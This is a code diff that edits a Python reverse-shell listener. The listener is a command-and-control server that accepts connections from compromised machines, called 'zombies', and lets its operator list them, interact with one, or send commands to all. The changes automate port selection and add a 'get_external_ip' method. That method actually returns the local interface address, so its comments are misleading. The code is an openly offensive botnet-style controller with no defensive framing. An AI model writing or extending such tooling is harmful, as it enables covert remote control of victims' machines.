@@ -27,27 +27,27 @@ def find_free_port(host, start_port, end_port):
 
 
 class ReverseShellListener:
-    def __init__(self, host=None, port=None):
-        self.host = host if host else self.get_local_ip()
-        self.port = port
+    def __init__(self):
+        self.host = self.get_local_ip()
+        self.port = None  # Will be determined automatically
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.zombies = []
         self.zombie_lock = threading.Lock()
         self.shutdown_flag = False
+        self.external_ip = self.get_external_ip()
 
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
 
     def start(self):
         try:
-            # Automatically find a free port if not provided
+            # Automatically find a free port
+            print(f"{Fore.YELLOW}[INFO] Scanning for a free port...")
+            self.port = find_free_port(self.host, 8080, 8090)  # Adjust the range if needed
             if self.port is None:
-                print(f"{Fore.YELLOW}[INFO] Scanning for a free port...")
-                self.port = find_free_port(self.host, 8080, 8090)  # Adjust the range if needed
-                if self.port is None:
-                    print(f"{Fore.RED}[!] No free port found in the given range.")
-                    return
+                print(f"{Fore.RED}[!] No free port found in the given range.")
+                return
             self.server.bind((self.host, self.port))
             self.server.listen(5)
             print(f"{Fore.GREEN}[+] Listening on {self.host}:{self.port}")
@@ -73,6 +73,17 @@ class ReverseShellListener:
         finally:
             s.close()
         return local_ip
+    
+    def get_external_ip(self):
+        try:
+            # Use a reliable external service to get the public IP
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))  # Google's public DNS server
+            external_ip = s.getsockname()[0]
+            s.close()
+            return external_ip
+        except Exception:
+            return "Could not determine external IP"
 
     def accept_connections(self):
         while not self.shutdown_flag:
@@ -163,7 +174,12 @@ class ReverseShellListener:
     def main_menu(self):
         while not self.shutdown_flag:
             os.system("cls" if sys.platform == "win32" else "clear")
-            print(f"\n{Fore.CYAN}--- Main Menu ---")
+
+            # Print listening information at the top of the menu
+            print(f"{Fore.CYAN}--- Reverse Shell Listener ---")
+            print(f"{Fore.GREEN}[+] Listening on {self.external_ip}:{self.port}")  # Use external IP here
+            print(f"{Fore.CYAN}--- Main Menu ---")
+
             print(f"{Fore.YELLOW}1.{Style.BRIGHT} List zombies")
             print(f"{Fore.YELLOW}2.{Style.BRIGHT} Interact with a zombie")
             print(f"{Fore.YELLOW}3.{Style.BRIGHT} Send command to all zombies")
@@ -287,7 +303,5 @@ class ReverseShellListener:
 
 
 if __name__ == "__main__":
-    host = None
-    port = None
-    listener = ReverseShellListener(host=host, port=port)
+    listener = ReverseShellListener()
     listener.start()
